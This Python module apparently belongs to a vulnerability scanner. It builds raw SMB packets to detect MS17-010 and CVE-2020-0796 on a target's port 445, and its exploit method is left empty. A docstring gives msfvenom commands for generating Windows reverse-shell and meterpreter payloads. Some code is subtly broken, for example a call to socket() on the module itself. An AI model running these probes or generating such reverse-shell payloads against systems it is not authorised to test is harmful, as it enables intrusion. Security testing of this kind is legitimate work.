# -*- coding: utf-8 -*-
from lib.util.exprequest import ExpRequest
from lib.util.output import Output
import lib.util.globalvar as GlobalVar
import socket
import struct
"""
+-------------+-----------+--------------------------------------------------------------------------------------------+
| Target type | Vuln Name | Impact Version && Vulnerability description                                                |
+-------------+-----------+--------------------------------------------------------------------------------------------+
| Windows     | smb_17010 | [!] You can make a nc reverse shell USER_SHELLCODE_FILE in kali2.0 by use :                |
|             |           | msfvenom -p windows/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=xxx -f raw > shellcode       |
|             |           | [!] You can make a meterpreter reverse shell USER_SHELLCODE_FILE in kali2.0 by use :       |
|             |           | msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxx -f raw > shellcode |
+-------------+-----------+--------------------------------------------------------------------------------------------+
"""
class MS17010():
    packetnego = "\x00\x00\x00\x54"  # Session Message
    packetnego += "\xff\x53\x4d\x42"  # Server Component: SMB
    packetnego += "\x72"  # SMB Command: Negotiate Protocol (0x72)
    packetnego += "\x00"  # Error Class: Success (0x00)
    packetnego += "\x00"  # Reserved
    packetnego += "\x00\x00"  # Error Code: No Error
    packetnego += "\x18"  # Flags
    packetnego += "\x01\x28"  # Flags 2
    packetnego += "\x00\x00"  # Process ID High 0
    packetnego += "\x00\x00\x00\x00\x00\x00\x00\x00"  # Signature
    packetnego += "\x00\x00"  # Reserved
    packetnego += "\x00\x00"  # Tree id 0
    packetnego += "\x44\x6d"  # Process ID 27972
    packetnego += "\x00\x00"  # User ID 0
    packetnego += "\x42\xc1"  # Multiplex ID 49474
    packetnego += "\x00"  # WCT 0
    packetnego += "\x31\x00"  # BCC 49
    packetnego += "\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00"  # LANMAN1.0
    packetnego += "\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00"  # LM1.2X002
    packetnego += "\x02\x4e\x54\x20\x4c\x41\x4e\x4d\x41\x4e\x20\x31\x2e\x30\x00"  # NT LANMAN 1.0
    packetnego += "\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00"  # NT LM 0.12

    def __init__(self,ip,port):
        self.ip = ip
        self.port = port

    def handle(self,data, iptarget):
        ## SMB Command: Session Setup AndX Request, User: .\
        if data[8:10] == "\x72\x00":
            packetsession = "\xff\x53\x4d\x42"  # Server Component: SMB
            packetsession += "\x73"  # SMB Command: Session Setup AndX (0x73)
            packetsession += "\x00"  # Error Class: Success (0x00)
            packetsession += "\x00"  # Reserved
            packetsession += "\x00\x00"  # Error Code: No Error
            packetsession += "\x18"  # Flags
            packetsession += "\x01\x28"  # Flags 2
            packetsession += "\x00\x00"  # Process ID High 0
            packetsession += "\x00\x00\x00\x00\x00\x00\x00\x00"  # Signature
            packetsession += "\x00\x00"  # Reserved
            packetsession += data[28:34]  # TID+PID+UID
            packetsession += "\x42\xc1"  # Multiplex ID 49474
            packetsession += "\x0d"  # WCT 0
            packetsession += "\xff"  # AndXCommand: No further commands (0xff)
            packetsession += "\x00"  # Reserved 00
            packetsession += "\x00\x00"  # AndXOffset: 0
            packetsession += "\xdf\xff"  # Max Buffer: 65503
            packetsession += "\x02\x00"  # Max Mpx Count: 2
            packetsession += "\x01\x00"  # VC Number: 1
            packetsession += "\x00\x00\x00\x00"  # Session Key: 0x00000000
            packetsession += "\x00\x00"  # ANSI Password Length: 0
            packetsession += "\x00\x00"  # Unicode Password Length: 0
            packetsession += "\x00\x00\x00\x00"  # Reserved: 00000000
            packetsession += "\x40\x00\x00\x00"  # Capabilities: 0x00000040, NT Status Codes
            packetsession += "\x26\x00"  # Byte Count (BCC): 38
            packetsession += "\x00"  # Account:
            packetsession += "\x2e\x00"  # Primary Domain: .
            packetsession += "\x57\x69\x6e\x64\x6f\x77\x73\x20\x32\x30\x30\x30\x20\x32\x31\x39\x35\x00"  # Native OS: Windows 2000 2195
            packetsession += "\x57\x69\x6e\x64\x6f\x77\x73\x20\x32\x30\x30\x30\x20\x35\x2e\x30\x00"  # Native LAN Manager: Windows 2000 5.0

            return struct.pack(">i", len(packetsession)) + bytes(packetsession)

        ## Tree Connect AndX Request, Path: \\ip\IPC$
        if data[8:10] == "\x73\x00":
            share = "\xff\x53\x4d\x42"  # Server Component: SMB
            share += "\x75"  # SMB Command: Tree Connect AndX (0x75)
            share += "\x00"  # Error Class: Success (0x00)
            share += "\x00"  # Reserved
            share += "\x00\x00"  # Error Code: No Error
            share += "\x18"  # Flags
            share += "\x01\x28"  # Flags 2
            share += "\x00\x00"  # Process ID High 0
            share += "\x00\x00\x00\x00\x00\x00\x00\x00"  # Signature
            share += "\x00\x00"  # Reserved
            share += data[28:34]  # TID+PID+UID
            share += "\x42\xc1"  # Multiplex ID 49474
            share += "\x04"  # WCT 4
            share += "\xff"  # AndXCommand: No further commands (0xff)
            share += "\x00"  # Reserved: 00
            share += "\x00\x00"  # AndXOffset: 0
            share += "\x00\x00"  # Flags: 0x0000
            share += "\x01\x00"  # Password Length: 1
            share += "\x19\x00"  # Byte Count (BCC): 25
            share += "\x00"  # Password: 00
            share += "\x5c\x5c" + iptarget + "\x5c\x49\x50\x43\x24\x00"  # Path: \\ip_target\IPC$
            share += "\x3f\x3f\x3f\x3f\x3f\x00"

            return struct.pack(">i", len(share)) + bytes(share)

        ## PeekNamedPipe Request, FID: 0x0000
        if data[8:10] == "\x75\x00":
            smbpipefid0 = "\xff\x53\x4d\x42"  # Server Component: SMB
            smbpipefid0 += "\x25"  # SMB Command: Trans (0x25)
            smbpipefid0 += "\x00"  # Error Class: Success (0x00)
            smbpipefid0 += "\x00"  # Reserved
            smbpipefid0 += "\x00\x00"  # Error Code: No Error
            smbpipefid0 += "\x18"  # Flags
            smbpipefid0 += "\x01\x28"  # Flags 2
            smbpipefid0 += "\x00\x00"  # Process ID High 0
            smbpipefid0 += "\x00\x00\x00\x00\x00\x00\x00\x00"  # Signature
            smbpipefid0 += "\x00\x00"  # Reserved
            smbpipefid0 += data[28:34]  # TID+PID+UID
            smbpipefid0 += "\x42\xc1"  # Multiplex ID 49474
            smbpipefid0 += "\x10"  # Word Count (WCT): 16
            smbpipefid0 += "\x00\x00"  # Total Parameter Count: 0
            smbpipefid0 += "\x00\x00"  # Total Data Count: 0
            smbpipefid0 += "\xff\xff"  # Max Parameter Count: 65535
            smbpipefid0 += "\xff\xff"  # Max Data Count: 65535
            smbpipefid0 += "\x00"  # Max Setup Count: 0
            smbpipefid0 += "\x00"  # Reserved: 00
            smbpipefid0 += "\x00\x00"  # Flags: 0x0000
            smbpipefid0 += "\x00\x00\x00\x00"  # Timeout: Return immediately (0)
            smbpipefid0 += "\x00\x00"  # Reserved: 0000
            smbpipefid0 += "\x00\x00"  # Parameter Count: 0
            smbpipefid0 += "\x4a\x00"  # Parameter Offset: 74
            smbpipefid0 += "\x00\x00"  # Data Count: 0
            smbpipefid0 += "\x4a\x00"  # Data Offset: 74
            smbpipefid0 += "\x02"  # Setup Count: 2
            smbpipefid0 += "\x00"  # Reserved: 00
            smbpipefid0 += "\x23\x00"  # Function: PeekNamedPipe (0x0023)
            smbpipefid0 += "\x00\x00"  # FID: 0x0000
            smbpipefid0 += "\x07\x00"  # Byte Count (BCC): 7
            smbpipefid0 += "\x5c\x50\x49\x50\x45\x5c\x00"  # Transaction Name: \PIPE\

            return struct.pack(">i", len(smbpipefid0)) + bytes(smbpipefid0)

    def conn(self):
        try:
            s = socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((str(self.ip), 445))
            s.send(bytes(self.packetnego,'utf8'))
            try:
                while True:

                    data = s.recv(1024)
                    # Get Native OS from Session Setup AndX Response
                    if data[8:10] == "\x73\x00":
                        nativeos = data[45:100].split(b'\x00' * 1)[0]
                    #                    logger.info("[+] "+str(targets)+"\t"+nativeos)

                    ## Trans Response, Error: STATUS_INSUFF_SERVER_RESOURCES
                    if data[8:10] == "\x25\x05":
                        ## 0x05 0x02 0x00 0xc0 = STATUS_INSUFF_SERVER_RESOURCES
                        if data[9:13] == "\x05\x02\x00\xc0":
                            return True

                    s.send(self.handle(data, str(self.ip)))
            except Exception as err:
                print(err)
                s.close()
        except Exception as err:
            print(err)
            return False
        
    def scan(self):
        return self.conn()

    def exe(self):
        pass


class windowssmbv3():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = int(env.get('timeout'))
        self.retry_time = int(env.get('retry_time'))
        self.retry_interval = int(env.get('retry_interval'))
        self.flag = GlobalVar.get_value('flag')
        self.win_cmd = 'cmd /c '+ env.get('cmd', 'echo '+self.flag)
        self.linux_cmd = env.get('cmd', 'echo '+self.flag)

    def smb_ms17010(self):
        
        
        
        pass


    def CVE_2020_0796(self):
        appName = 'windowssmbv3'
        pocname = 'CVE_2020_0796'
        method = 'socket'
        payload =  b'\x00\x00\x00\xc0\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00\x08\x00\x01\x00\x00\x00\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00x\x00\x00\x00\x02\x00\x00\x00\x02\x02\x10\x02"\x02$\x02\x00\x03\x02\x03\x10\x03\x11\x03\x00\x00\x00\x00\x01\x00&\x00\x00\x00\x00\x00\x01\x00 \x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\n\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'
        desc = 'Windows : CVE_2020_0796'
        info = 'WindowsSMBv3协议漏洞'
        #输出类
        output = Output(self.url, appName, pocname)
        try:
            sock = socket.socket(socket.AF_INET)
            sock.settimeout(3)
            ip = socket.gethostbyname(self.url)
            sock.connect((ip, 445))
            sock.send(payload)
            nb, = struct.unpack(">I", sock.recv(4))
            res = sock.recv(nb)
            if (not res[68:70] == b"\x11\x03") or (not res[70:72] == b"\x02\x00"):
                return output.fail()
            else:
                info = "{}存在WindowsSMBv3协议漏洞(CVE-2020-0796), IP值:{}".format(self.url,ip)
                return output.echo_success(method, info)
        except Exception as error:
            return output.error_output(str(error))

def check(**kwargs):
    thread_list = []
    ExpWindowsSMBv3 = windowssmbv3(**kwargs)
    #调用单个函数
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(ExpWindowsSMBv3, kwargs['pocname'])))
    #调用所有函数
    else:
        for func in dir(windowssmbv3):
            if not func.startswith("__"):
                thread_list.append(kwargs['pool'].submit(getattr(ExpWindowsSMBv3, func)))
    #保存全局子线程列表
    GlobalVar.add_value('thread_list', thread_list)